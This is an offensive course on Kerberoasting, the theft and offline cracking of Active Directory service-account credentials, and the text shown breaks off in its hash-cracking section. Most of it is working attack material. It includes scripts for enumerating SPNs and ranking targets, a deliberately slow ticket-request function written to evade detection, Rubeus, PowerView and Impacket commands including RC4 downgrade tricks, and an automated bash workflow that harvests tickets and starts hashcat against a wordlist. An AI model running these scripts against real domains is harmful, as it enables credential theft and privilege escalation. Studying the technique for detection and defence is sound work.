# Kerberoasting: Complete Attack Course

## Table of Contents

1. [Introduction to Kerberoasting](#1-introduction-to-kerberoasting)
2. [Kerberos Service Authentication Fundamentals](#2-kerberos-service-authentication-fundamentals)
3. [Technical Details of Kerberoasting](#3-technical-details-of-kerberoasting)
4. [Service Principal Names (SPNs) and Vulnerable Accounts](#4-service-principal-names-spns-and-vulnerable-accounts)
5. [Reconnaissance and Target Identification](#5-reconnaissance-and-target-identification)
6. [Exploitation Techniques and Tools](#6-exploitation-techniques-and-tools)
7. [Hash Cracking and Analysis](#7-hash-cracking-and-analysis)
8. [Post-Exploitation Considerations](#8-post-exploitation-considerations)
9. [Detection and Defensive Measures](#9-detection-and-defensive-measures)
10. [Real-World Scenarios and Case Studies](#10-real-world-scenarios-and-case-studies)

---

## 1. Introduction to Kerberoasting

### What is Kerberoasting?

Kerberoasting is a post-exploitation attack technique that targets service accounts in Active Directory environments by requesting Kerberos service tickets (TGS) for Service Principal Names (SPNs). These tickets are encrypted with the service account's password hash, allowing attackers to extract them and perform offline password cracking without generating failed authentication logs.

### Attack Classification

**Attack Type**: Credential Access (MITRE ATT&CK T1558.003)

**Prerequisites**:
- Valid domain user credentials (any authenticated user)
- Network access to domain controller
- Knowledge of SPNs in the environment
- No special privileges required

**Impact Level**: Critical - Often leads to privileged account compromise

### Why Kerberoasting is Significant

**Key Advantages for Attackers**:
- Requires only standard domain user access
- No special privileges needed to request TGS tickets
- Offline cracking prevents real-time detection
- Service accounts often have weak or old passwords
- Service accounts frequently have elevated privileges
- Legitimate traffic makes detection challenging

**Common Target Accounts**:
- SQL Server service accounts
- IIS application pool identities
- Exchange Server accounts
- SharePoint service accounts
- Custom application service accounts
- Legacy system integration accounts

### Attack vs AS-REP Roasting Comparison

| Feature                 | Kerberoasting                 | AS-REP Roasting           |
| ----------------------- | ----------------------------- | ------------------------- |
| Authentication Required | Yes (any domain user)         | No                        |
| Target Accounts         | Service accounts with SPNs    | Accounts without pre-auth |
| Encryption Used         | Service account password      | User account password     |
| Ticket Type             | TGS (Service Ticket)          | AS-REP (TGT response)     |
| Prevalence              | Very common                   | Less common               |
| Privilege Level         | Often high (service accounts) | Variable                  |

---

## 2. Kerberos Service Authentication Fundamentals

### Standard Kerberos Service Ticket Flow

Understanding the complete Kerberos authentication process is essential for comprehending Kerberoasting.

#### Step 1: Initial Authentication (AS Exchange)

```
Client → KDC: AS-REQ (Authentication Request)
Includes: Username, timestamp encrypted with user's password

KDC → Client: AS-REP (Authentication Response)
Contains: TGT (Ticket Granting Ticket) encrypted with user's password
```

#### Step 2: Service Ticket Request (TGS Exchange)

```
Client → KDC: TGS-REQ (Ticket Granting Service Request)
Includes: TGT + SPN of requested service

KDC → Client: TGS-REP (Ticket Granting Service Response)
Contains: Service Ticket encrypted with SERVICE ACCOUNT's password hash
```

#### Step 3: Service Authentication (AP Exchange)

```
Client → Service: AP-REQ (Application Request)
Includes: Service ticket + authenticator

Service → Client: AP-REP (Application Response)
Contains: Mutual authentication data (optional)
```

### Service Principal Names (SPNs)

**What is an SPN?**

An SPN is a unique identifier for a service instance, binding a service to a logon account. It enables Kerberos authentication to determine which account credentials to use for encrypting service tickets.

**SPN Format**:

```
ServiceClass/Host:Port/ServiceName
```

**Common SPN Examples**:

```
MSSQLSvc/sql-server.company.com:1433
MSSQLSvc/sql-server.company.com:1433/PRODUCTION
HTTP/web-server.company.com
HTTP/web-server.company.com:8080
TERMSRV/remote-server.company.com
WSMAN/management-server.company.com
HOST/file-server.company.com
```

### The Kerberoasting Vulnerability

**Why This Works**:

1. **Legitimate Functionality**: Any authenticated domain user can request service tickets for any SPN
2. **Encryption Weakness**: Service tickets are encrypted with the service account's password hash
3. **Offline Access**: Tickets can be extracted and cracked offline without further network interaction
4. **No Logging**: Successful ticket requests generate normal Kerberos events, not security alerts

**The Attack Chain**:

```
1. Authenticate as low-privileged domain user
2. Query Active Directory for accounts with SPNs
3. Request TGS tickets for discovered SPNs
4. Extract tickets from memory or network capture
5. Convert tickets to crackable hash format
6. Perform offline brute-force attack
7. Obtain service account plaintext password
```

### Service Ticket Structure

**TGS-REP Components**:

```
TGS-REP Message:
├── Protocol Version
├── Message Type (TGS-REP)
├── Ticket (Service Ticket)
│   ├── Service Principal Name
│   ├── Encrypted Part (Service Account Password Hash)
│   │   ├── Session Key
│   │   ├── Client Name
│   │   ├── Transited Services
│   │   ├── Authorization Data
│   │   └── Ticket Flags
│   └── Encryption Type
└── Encrypted Part (Session Key)
    └── Additional Session Info
```

**Encryption Details**:

The service ticket's encrypted portion contains data encrypted with the service account's NTLM hash (for RC4-HMAC) or Kerberos keys (for AES). This encrypted data can be extracted and subjected to password cracking attacks.

---

## 3. Technical Details of Kerberoasting

### TGS-REP Message Analysis

#### Encryption Types

**Common Encryption Types in Service Tickets**:

- **Type 23**: RC4-HMAC-MD5 (most vulnerable, fastest to crack)
- **Type 17**: AES128-CTS-HMAC-SHA1-96
- **Type 18**: AES256-CTS-HMAC-SHA1-96

**Encryption Type Priority**:

Windows negotiates encryption types based on supported algorithms. By default, modern systems prefer AES, but attackers can request specific encryption types.

```
Requested Encryption Types (in order of attacker preference):
1. RC4-HMAC (type 23) - Weakest, fastest to crack
2. AES128 (type 17) - Moderate strength
3. AES256 (type 18) - Strongest, slowest to crack
```

#### Hash Format Structure

**Kerberos TGS Hash Format**:

```
$krb5tgs$<encryption_type>$*<username>$<domain>$<SPN>*$<checksum>$<encrypted_data>
```

**Example Hash**:

```
$krb5tgs$23$*sqlsvc$COMPANY.COM$MSSQLSvc/sql-server.company.com:1433*$a3f2c4d8e9f1b2c3$4f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c...
```

**Field Breakdown**:

- `$krb5tgs$`: Hash type identifier
- `23`: Encryption type (RC4-HMAC)
- `sqlsvc`: Username requesting ticket
- `COMPANY.COM`: Domain realm
- `MSSQLSvc/sql-server.company.com:1433`: Target SPN
- `a3f2c4d8e9f1b2c3`: Checksum value
- `4f6a7b8c...`: Encrypted ticket data (contains crackable material)

### Cryptographic Details

#### RC4-HMAC Encryption Process

**How Service Accounts Encrypt Tickets**:

1. Service account password is hashed using NTLM (MD4)
2. NTLM hash is used as RC4 encryption key
3. Session key and authorization data are encrypted
4. Encrypted blob is embedded in service ticket

**Why RC4 is Vulnerable**:

- Fast encryption/decryption enables rapid password guessing
- Weaker than AES algorithms
- No salt in NTLM hashing process
- Susceptible to rainbow table attacks for common passwords

#### AES Encryption Process

**AES-Based Ticket Encryption**:

1. Password converted to UTF-8
2. PBKDF2 derives key from password with salt
3. Salt includes domain and username information
4. AES encryption applied with derived key
5. HMAC-SHA1 used for integrity verification

**Why AES is Harder to Crack**:

- Key derivation requires more computational resources
- Salted passwords prevent rainbow tables
- Longer key lengths (128-bit or 256-bit)
- PBKDF2 iteration count adds computational cost

### Ticket Request Manipulation

#### Downgrade Attacks

Attackers can manipulate requests to force weaker encryption:

```python
# Request RC4 encryption specifically
from impacket.krb5 import constants

supported_enctypes = (
    constants.EncryptionTypes.rc4_hmac.value,  # Force RC4
)
```

**Server Response Behavior**:

If the service account supports RC4 encryption (and it hasn't been explicitly disabled), the KDC will issue a ticket encrypted with RC4, even if stronger algorithms are available.

#### SPN Enumeration Techniques

**LDAP Query for SPNs**:

```ldap
(&(objectClass=user)(servicePrincipalName=*))
```

**PowerShell SPN Discovery**:

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### Network Protocol Analysis

#### Kerberos Traffic Characteristics

**Port Usage**:
- TCP/UDP 88: Kerberos authentication
- TCP/UDP 464: Kerberos password change

**Packet Structure**:

```
Kerberos TGS-REQ:
├── KDC-REQ-BODY
│   ├── KDC Options
│   ├── Server Name (SPN)
│   ├── Encryption Types
│   ├── Nonce
│   └── Till (expiration time)
└── Authenticator (TGT)

Kerberos TGS-REP:
├── Client Name
├── Ticket (Service Ticket)
│   └── Encrypted Part ← Target for extraction
└── Encrypted Part (Session Key)
```

---

## 4. Service Principal Names (SPNs) and Vulnerable Accounts

### Understanding Service Accounts

#### Types of Service Accounts

**1. Domain Service Accounts**

Standard domain user accounts configured to run services:

```powershell
# Typical service account configuration
New-ADUser -Name "svc_sql" -UserPrincipalName "svc_sql@company.com" -AccountPassword $SecurePassword
Set-ADUser svc_sql -PasswordNeverExpires $true
```

**2. Managed Service Accounts (MSA)**

Introduced in Windows Server 2008 R2:

```powershell
# Create Managed Service Account
New-ADServiceAccount -Name svc_webapp_msa -RestrictToSingleComputer
```

**3. Group Managed Service Accounts (gMSA)**

Enhanced MSAs supporting multiple servers:

```powershell
# Create Group Managed Service Account
New-ADServiceAccount -Name svc_app_gmsa -DNSHostName svc_app_gmsa.company.com -PrincipalsAllowedToRetrieveManagedPassword "AppServers"
```

**Kerberoasting Vulnerability by Account Type**:

| Account Type | Vulnerable to Kerberoasting | Reason |
|--------------|----------------------------|---------|
| Domain User with SPN | Yes | Password is user-controlled |
| Computer Account | Difficult | 128-character random password |
| MSA | No | Managed by system, complex password |
| gMSA | No | Managed password, auto-rotation |

### Common SPN Configurations

#### SQL Server SPNs

**Manual SPN Registration**:

```cmd
setspn -A MSSQLSvc/sql-server.company.com:1433 COMPANY\svc_sql
setspn -A MSSQLSvc/sql-server.company.com COMPANY\svc_sql
```

**SQL Server SPN Patterns**:

```
MSSQLSvc/hostname.domain.com:1433
MSSQLSvc/hostname.domain.com
MSSQLSvc/hostname:1433
MSSQL/hostname.domain.com
```

#### IIS/Web Application SPNs

**HTTP SPNs for Web Applications**:

```cmd
setspn -A HTTP/webapp.company.com COMPANY\svc_webapp
setspn -A HTTP/webapp COMPANY\svc_webapp
```

**Common Web SPNs**:

```
HTTP/webserver.company.com
HTTP/webserver.company.com:8080
HTTP/intranet.company.com
HTTPS/secure.company.com
```

#### Exchange Server SPNs

**Exchange Service SPNs**:

```
exchangeMDB/server.company.com
exchangeRFR/server.company.com
exchangeAB/server.company.com
HTTP/mail.company.com
HTTP/autodiscover.company.com
```

#### Remote Desktop SPNs

**Terminal Services SPNs**:

```cmd
setspn -A TERMSRV/rdp-server.company.com COMPANY\svc_rdp
```

### Identifying High-Value Targets

#### Service Account Privilege Analysis

**Checking Group Memberships**:

```powershell
# Find service accounts with admin rights
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties MemberOf | 
    Where-Object {
        $_.MemberOf -match "Domain Admins|Enterprise Admins|Administrators"
    } | Select-Object Name, SamAccountName, MemberOf
```

**Common Privileged Service Accounts**:

- SQL Server DBAs running with Domain Admin rights
- Backup service accounts with access to all systems
- Monitoring accounts with broad read permissions
- Application service accounts with delegation rights

#### Password Age Analysis

**Finding Stale Service Account Passwords**:

```powershell
# Service accounts with old passwords
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties PasswordLastSet, PasswordNeverExpires |
    Where-Object {
        $_.PasswordNeverExpires -eq $true -or
        $_.PasswordLastSet -lt (Get-Date).AddYears(-1)
    } | Select-Object Name, PasswordLastSet, PasswordNeverExpires
```

**Risk Indicators**:

- Passwords set more than 1 year ago
- "Password never expires" enabled
- Account created years ago with no password change
- Service accounts with simple naming patterns

### SPN Misconfiguration Issues

#### Duplicate SPNs

**Finding Duplicate SPNs**:

```powershell
# Detect duplicate SPN registrations
$AllSPNs = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
$Duplicates = $AllSPNs | Select-Object -ExpandProperty ServicePrincipalName | 
    Group-Object | Where-Object {$_.Count -gt 1}

foreach ($Duplicate in $Duplicates) {
    Write-Warning "Duplicate SPN found: $($Duplicate.Name)"
    Get-ADUser -Filter {ServicePrincipalName -eq $Duplicate.Name} | 
        Select-Object Name, SamAccountName
}
```

**Problems with Duplicate SPNs**:

- Authentication failures or unpredictable behavior
- Load balancing issues
- Ticket encrypted with wrong account's password
- Potential security vulnerabilities

#### Orphaned SPNs

**Identifying Orphaned SPNs**:

```powershell
# Find SPNs where the host no longer exists
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | 
    ForEach-Object {
        $User = $_
        $_.ServicePrincipalName | ForEach-Object {
            if ($_ -match "/(.+?)(?::|\s|$)") {
                $HostName = $matches[1]
                try {
                    $null = Resolve-DnsName $HostName -ErrorAction Stop
                } catch {
                    Write-Warning "Orphaned SPN: $_ on account $($User.Name)"
                }
            }
        }
    }
```

#### Incorrect SPN Formats

**Common SPN Mistakes**:

```
# Incorrect formats
MSSQLSvc\sql-server.company.com:1433  # Wrong separator (\)
HTTP//webapp.company.com               # Wrong separator (//)
http/webapp.company.com                # Wrong case (http vs HTTP)
MSSQLSvc/sql-server:INSTANCE          # Missing domain

# Correct formats
MSSQLSvc/sql-server.company.com:1433
HTTP/webapp.company.com
TERMSRV/rdp-server.company.com
```

---

## 5. Reconnaissance and Target Identification

### Authenticated Enumeration

#### PowerShell-Based Discovery

**Basic SPN Enumeration**:

```powershell
# Find all accounts with SPNs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName, PasswordLastSet, MemberOf |
    Select-Object Name, SamAccountName, ServicePrincipalName, PasswordLastSet |
    Format-List
```

**Advanced Filtering**:

```powershell
# Target specific service types
$TargetServices = @("MSSQLSvc", "HTTP", "TERMSRV")

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName, PasswordLastSet, AdminCount |
    Where-Object {
        $spn = $_.ServicePrincipalName
        $TargetServices | ForEach-Object {
            if ($spn -like "$_*") { return $true }
        }
    } | Select-Object Name, ServicePrincipalName, PasswordLastSet, AdminCount
```

**Prioritized Target List**:

```powershell
# Score service accounts by attractiveness
function Get-KerberoastingTargets {
    $ServiceAccounts = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties *
    
    foreach ($Account in $ServiceAccounts) {
        $Score = 0
        
        # High-value group memberships
        if ($Account.MemberOf -match "Domain Admins") { $Score += 100 }
        if ($Account.MemberOf -match "Enterprise Admins") { $Score += 100 }
        if ($Account.MemberOf -match "Administrators") { $Score += 50 }
        if ($Account.AdminCount -eq 1) { $Score += 75 }
        
        # Password age
        $PasswordAge = (Get-Date) - $Account.PasswordLastSet
        if ($PasswordAge.Days -gt 365) { $Score += 50 }
        if ($PasswordAge.Days -gt 730) { $Score += 75 }
        
        # Password never expires
        if ($Account.PasswordNeverExpires) { $Score += 25 }
        
        # Weak encryption support
        if ($Account.UserAccountControl -band 0x200000) { $Score += 40 }  # Use DES
        
        [PSCustomObject]@{
            Name = $Account.Name
            SamAccountName = $Account.SamAccountName
            SPNs = $Account.ServicePrincipalName -join "; "
            PasswordAge = $PasswordAge.Days
            Groups = ($Account.MemberOf | ForEach-Object { $_.Split(',')[0].Replace('CN=','') }) -join ", "
            Score = $Score
        }
    }
}

Get-KerberoastingTargets | Sort-Object Score -Descending | Format-Table -AutoSize
```

#### LDAP Enumeration

**Raw LDAP Queries**:

```powershell
# LDAP filter for SPNs
$Searcher = New-Object System.DirectoryServices.DirectorySearcher
$Searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*))"
$Searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","pwdlastset","memberof"))
$Results = $Searcher.FindAll()

foreach ($Result in $Results) {
    $Properties = $Result.Properties
    [PSCustomObject]@{
        SamAccountName = $Properties.samaccountname[0]
        SPNs = $Properties.serviceprincipalname -join "; "
        PasswordLastSet = [DateTime]::FromFileTime($Properties.pwdlastset[0])
        Groups = $Properties.memberof -join "; "
    }
}
```

**Python LDAP Enumeration**:

```python
#!/usr/bin/env python3
from ldap3 import Server, Connection, SUBTREE
import datetime

def enumerate_spns(dc_ip, domain, username, password):
    server = Server(dc_ip)
    conn = Connection(server, user=f"{domain}\\{username}", password=password)
    
    if not conn.bind():
        print(f"[-] Authentication failed: {conn.result}")
        return
    
    search_base = ','.join([f"DC={part}" for part in domain.split('.')])
    search_filter = "(&(objectClass=user)(servicePrincipalName=*))"
    attributes = ['sAMAccountName', 'servicePrincipalName', 'pwdLastSet', 'memberOf', 'userAccountControl']
    
    conn.search(search_base, search_filter, SUBTREE, attributes=attributes)
    
    results = []
    for entry in conn.entries:
        # Convert Windows filetime to datetime
        pwd_last_set = entry.pwdLastSet.value
        if pwd_last_set and pwd_last_set > 0:
            pwd_date = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=pwd_last_set/10)
            days_old = (datetime.datetime.now() - pwd_date).days
        else:
            days_old = None
        
        results.append({
            'username': str(entry.sAMAccountName),
            'spns': [str(spn) for spn in entry.servicePrincipalName],
            'password_age_days': days_old,
            'groups': [str(group) for group in entry.memberOf] if entry.memberOf else []
        })
    
    # Sort by password age (oldest first)
    results.sort(key=lambda x: x['password_age_days'] if x['password_age_days'] else 0, reverse=True)
    
    return results

# Usage
targets = enumerate_spns("192.168.1.10", "company.com", "lowpriv_user", "password123")
for target in targets:
    print(f"\n[+] Target: {target['username']}")
    print(f"    SPNs: {', '.join(target['spns'])}")
    print(f"    Password Age: {target['password_age_days']} days")
    print(f"    Groups: {', '.join(target['groups'][:3])}")  # Show first 3 groups
```

### Network-Based Discovery

#### Passive Network Monitoring

**Wireshark/TCPDump for SPN Discovery**:

```bash
# Capture Kerberos traffic
tcpdump -i eth0 -n -s0 port 88 -w kerberos.pcap

# Filter for TGS-REQ packets
tshark -r kerberos.pcap -Y "kerberos.msg_type == 12" -T fields \
    -e kerberos.SNameString \
    -e ip.src \
    -e ip.dst | sort -u
```

**Python Packet Capture for SPN Extraction**:

```python
from scapy.all import *
from collections import defaultdict

spn_usage = defaultdict(int)

def process_kerberos(packet):
    if packet.haslayer(TCP) and packet[TCP].dport == 88:
        # Extract and analyze Kerberos TGS-REQ
        try:
            payload = bytes(packet[TCP].payload)
            # Parse Kerberos ASN.1 structure for SPN
            # (Simplified - actual implementation requires ASN.1 parsing)
            if b'MSSQLSvc' in payload or b'HTTP' in payload:
                # Extract SPN string
                spn = extract_spn_from_payload(payload)
                if spn:
                    spn_usage[spn] += 1
                    print(f"[+] SPN discovered: {spn}")
        except:
            pass

sniff(filter="tcp port 88", prn=process_kerberos, store=0)

# Print summary
print("\n[*] SPN Usage Summary:")
for spn, count in sorted(spn_usage.items(), key=lambda x: x[1], reverse=True):
    print(f"    {spn}: {count} requests")
```

### BloodHound Integration

#### Collecting Kerberoasting Data

**SharpHound Collection**:

```powershell
# Collect all data including SPNs
.\SharpHound.exe -c All --outputdirectory C:\temp

# Kerberoastable users only
.\SharpHound.exe -c Container,Group,LocalGroup,GPOLocalGroup,Session,LoggedOn,Trusts,ACL,ObjectProps,SPNTargets
```

**BloodHound Python Collector**:

```bash
# Remote collection
bloodhound-python -u username -p password -d company.com -dc dc.company.com -c All

# Kerberoastable user analysis
bloodhound-python -u username -p password -d company.com -dc dc.company.com -c SPNTargets
```

#### BloodHound Queries for Kerberoasting

**Custom Cypher Queries**:

```cypher
// Find all kerberoastable users
MATCH (u:User {hasspn:true})
RETURN u.name, u.serviceprincipalnames

// Kerberoastable users with path to Domain Admins
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@COMPANY.COM"}))
RETURN p

// Kerberoastable users with admin rights on computers
MATCH (u:User {hasspn:true})
MATCH (u)-[:AdminTo]->(c:Computer)
RETURN u.name, COUNT(c) as AdminCount
ORDER BY AdminCount DESC

// High-value kerberoastable targets
MATCH (u:User {hasspn:true})
WHERE u.admincount = true OR u.owned = true
RETURN u.name, u.serviceprincipalnames, u.description

// Kerberoastable users with old passwords
MATCH (u:User {hasspn:true})
WHERE u.pwdlastset < (datetime().epochSeconds - (365 * 86400))
RETURN u.name, u.pwdlastset, u.serviceprincipalnames
```

### Targeted vs. Broad Enumeration

#### Stealth Considerations

**Low-and-Slow Approach**:

```powershell
# Gradual enumeration to avoid detection
function Invoke-StealthyKerberoast {
    param([int]$DelaySeconds = 300)
    
    $ServiceAccounts = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
    
    foreach ($Account in $ServiceAccounts) {
        Write-Host "[*] Requesting ticket for: $($Account.SamAccountName)"
        
        # Request single ticket
        Add-Type -AssemblyName System.IdentityModel
        foreach ($SPN in $Account.ServicePrincipalName) {
            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
            Write-Host "    [+] Ticket obtained for SPN: $SPN"
        }
        
        # Delay between requests
        if ($DelaySeconds -gt 0) {
            Write-Host "    [*] Waiting $DelaySeconds seconds..."
            Start-Sleep -Seconds $DelaySeconds
        }
    }
}

# Execute with 5-minute delays
Invoke-StealthyKerberoast -DelaySeconds 300
```

**Noise vs. Stealth Trade-offs**:

| Approach | Speed | Detection Risk | Coverage |
|----------|-------|----------------|----------|
| Mass request all SPNs | Minutes | High | Complete |
| Targeted high-value accounts | Hours | Medium | Selective |
| Low-and-slow with delays | Days | Low | Complete |
| Business hours only | Weeks | Very Low | Complete |

---

## 6. Exploitation Techniques and Tools

### Windows-Based Tools

#### Rubeus - Advanced Kerberoasting

**Basic Kerberoasting**:

```cmd
# Request tickets for all SPNs
Rubeus.exe kerberoast /outfile:tickets.txt

# Specific output format
Rubeus.exe kerberoast /format:hashcat /outfile:hashcat_hashes.txt
Rubeus.exe kerberoast /format:john /outfile:john_hashes.txt
```

**Advanced Techniques**:

```cmd
# Request RC4 tickets only (easier to crack)
Rubeus.exe kerberoast /tgtdeleg /rc4opsec

# Target specific user
Rubeus.exe kerberoast /user:svc_sql /outfile:sqlsvc_ticket.txt

# Target specific SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/sql-server.company.com:1433

# Use existing TGT
Rubeus.exe kerberoast /ticket:base64_tgt_here

# Enterprise principals (cross-trust attacks)
Rubeus.exe kerberoast /enterprise

# Specify domain controller
Rubeus.exe kerberoast /dc:dc.company.com /outfile:tickets.txt
```

**OPSEC-Safe Kerberoasting**:

```cmd
# RC4 downgrade with TGT delegation trick
Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:tickets.txt

# This technique:
# 1. Requests a TGT with the "delegation" flag
# 2. Uses that TGT to request service tickets
# 3. Forces RC4 encryption even on AES-enabled accounts
# 4. Avoids generating 4769 events with encryption downgrade warnings
```

#### PowerView Kerberoasting

**PowerView Integration**:

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Find kerberoastable users
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Request and extract tickets
Invoke-Kerberoast -OutputFormat Hashcat | Export-CSV -NoTypeInformation kerberoast_hashes.csv

# Target specific accounts
Invoke-Kerberoast -Identity svc_sql -OutputFormat John

# Request tickets for Domain Admin SPNs only
Get-DomainUser -SPN | Where-Object {$_.memberof -match "Domain Admins"} | Invoke-Kerberoast
```

**Advanced PowerView Queries**:

```powershell
# Find service accounts with admin rights
Get-DomainUser -SPN | Get-DomainObjectAcl -ResolveGUIDs | 
    Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}

# Service accounts with delegation privileges
Get-DomainUser -SPN -TrustedToAuth | Select-Object samaccountname, serviceprincipalname, msds-allowedtodelegateto

# Cross-domain kerberoasting
Get-DomainUser -SPN -Domain targetdomain.com | Invoke-Kerberoast
```

#### Native PowerShell Kerberoasting

**No External Tools Required**:

```powershell
# Pure PowerShell kerberoasting (no dependencies)
Add-Type -AssemblyName System.IdentityModel

function Invoke-NativeKerberoast {
    param(
        [string]$Domain = $env:USERDNSDOMAIN,
        [string]$OutputFile = "kerberoast_hashes.txt"
    )
    
    # Query AD for service accounts
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher
    $Searcher.SearchRoot = "LDAP://$Domain"
    $Searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*))"
    $Searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
    $Searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
    
    $Results = $Searcher.FindAll()
    
    $Hashes = @()
    
    foreach ($Result in $Results) {
        $Username = $Result.Properties["samaccountname"][0]
        $SPNs = $Result.Properties["serviceprincipalname"]
        
        foreach ($SPN in $SPNs) {
            try {
                Write-Host "[*] Requesting ticket for: $SPN ($Username)"
                
                # Request service ticket
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
                
                # Extract ticket from cache
                $TicketByteStream = $Ticket.GetRequest()
                
                if ($TicketByteStream) {
                    # Convert to base64 for extraction
                    $TicketHex = [System.BitConverter]::ToString($TicketByteStream) -replace "-", ""
                    
                    Write-Host "    [+] Ticket obtained! Length: $($TicketByteStream.Length) bytes"
                    
                    # Store for later processing
                    $Hashes += [PSCustomObject]@{
                        Username = $Username
                        SPN = $SPN
                        TicketHex = $TicketHex
                    }
                }
            } catch {
                Write-Warning "    [-] Failed to request ticket for $SPN : $_"
            }
        }
    }
    
    # Export results
    $Hashes | Export-Csv -Path $OutputFile -NoTypeInformation
    Write-Host "`n[+] Captured $($Hashes.Count) service tickets"
    Write-Host "[+] Results saved to: $OutputFile"
    
    return $Hashes
}

# Execute
$Tickets = Invoke-NativeKerberoast

# Extract tickets from memory using klist
klist | Out-File -FilePath "klist_output.txt"
```

### Linux-Based Tools

#### Impacket GetUserSPNs.py

**Basic Usage**:

```bash
# Request all service tickets
GetUserSPNs.py company.com/username:password -outputfile kerberoast_hashes.txt

# Save as hashcat format
GetUserSPNs.py company.com/username:password -request -outputfile hashes.txt

# Use Kerberos authentication (with valid TGT)
GetUserSPNs.py company.com/username -k -no-pass -dc-ip dc.company.com
```

**Advanced Options**:

```bash
# Target specific user
GetUserSPNs.py company.com/username:password -request-user svc_sql -outputfile svc_sql_hash.txt

# Request RC4 encryption only
GetUserSPNs.py company.com/username:password -request -outputfile hashes.txt -dc-ip dc.company.com

# Use NTLM hash instead of password
GetUserSPNs.py company.com/username -hashes :NTLM_HASH -request -outputfile hashes.txt

# Specify custom DC and save format
GetUserSPNs.py company.com/username:password -dc-ip 192.168.1.10 -request -outputfile hashes.txt

# Debug mode for troubleshooting
GetUserSPNs.py company.com/username:password -debug -request
```

**Stealth Techniques**:

```bash
# Time-delayed requests
for user in $(GetUserSPNs.py company.com/username:password | grep -oP 'svc_\w+'); do
    GetUserSPNs.py company.com/username:password -request-user $user -outputfile ${user}_hash.txt
    echo "[*] Sleeping 5 minutes..."
    sleep 300
done
```

### Automation Frameworks

**Automated Kerberoasting Workflow**:

```bash
#!/bin/bash
# Automated kerberoasting workflow

DOMAIN="company.com"
USERNAME="lowpriv_user"
PASSWORD="password123"
DC_IP="192.168.1.10"
OUTPUT_DIR="./kerberoast_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"

echo "[*] Starting automated kerberoasting workflow..."
echo "[*] Target domain: $DOMAIN"
echo "[*] Output directory: $OUTPUT_DIR"

# Step 1: Enumerate SPNs
echo -e "\n[*] Step 1: Enumerating service accounts..."
GetUserSPNs.py "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DC_IP" > "$OUTPUT_DIR/spn_enumeration.txt"

# Step 2: Request all tickets
echo -e "\n[*] Step 2: Requesting service tickets..."
GetUserSPNs.py "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DC_IP" -request -outputfile "$OUTPUT_DIR/all_hashes.txt"

# Step 3: Split hashes by encryption type
echo -e "\n[*] Step 3: Categorizing hashes by encryption type..."
grep '\$krb5tgs\$23\ "$OUTPUT_DIR/all_hashes.txt" > "$OUTPUT_DIR/rc4_hashes.txt" 2>/dev/null
grep '\$krb5tgs\$17\ "$OUTPUT_DIR/all_hashes.txt" > "$OUTPUT_DIR/aes128_hashes.txt" 2>/dev/null
grep '\$krb5tgs\$18\ "$OUTPUT_DIR/all_hashes.txt" > "$OUTPUT_DIR/aes256_hashes.txt" 2>/dev/null

# Count hashes
RC4_COUNT=$(wc -l < "$OUTPUT_DIR/rc4_hashes.txt" 2>/dev/null || echo 0)
AES128_COUNT=$(wc -l < "$OUTPUT_DIR/aes128_hashes.txt" 2>/dev/null || echo 0)
AES256_COUNT=$(wc -l < "$OUTPUT_DIR/aes256_hashes.txt" 2>/dev/null || echo 0)

echo "[+] Captured hashes:"
echo "    RC4-HMAC (type 23): $RC4_COUNT"
echo "    AES128 (type 17): $AES128_COUNT"
echo "    AES256 (type 18): $AES256_COUNT"

# Step 4: Start cracking RC4 hashes
if [ $RC4_COUNT -gt 0 ]; then
    echo -e "\n[*] Step 4: Starting hashcat on RC4 hashes..."
    hashcat -m 13100 "$OUTPUT_DIR/rc4_hashes.txt" /usr/share/wordlists/rockyou.txt \
        -o "$OUTPUT_DIR/cracked_passwords.txt" \
        --outfile-format=2 \
        > "$OUTPUT_DIR/cracking_status.txt" 2>&1 &
    
    echo "[+] Hashcat PID: $!"
fi

echo -e "\n[+] Kerberoasting workflow complete!"
echo "[+] Results saved to: $OUTPUT_DIR"
```

---

## 7. Hash Cracking and Analysis

### Understanding Hash Formats

#### Hashcat Mode Identification

**Kerberos TGS-REP Hash Modes**:

```bash
# Mode 13100: Kerberos 5 TGS-REP etype 23 (RC4-HMAC)
hashcat -m 13100 hashes.txt wordlist.txt

# Mode 19600: Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96)
hashcat -m 19600 hashes.txt wordlist.txt

# Mode 19700: Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)
hashcat -m 19700 hashes.txt wordlist.txt
```

### Hashcat Cracking Strategies

#### Dictionary Attacks

**Basic Dictionary Attack**:

```bash
# Standard wordlist attack
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
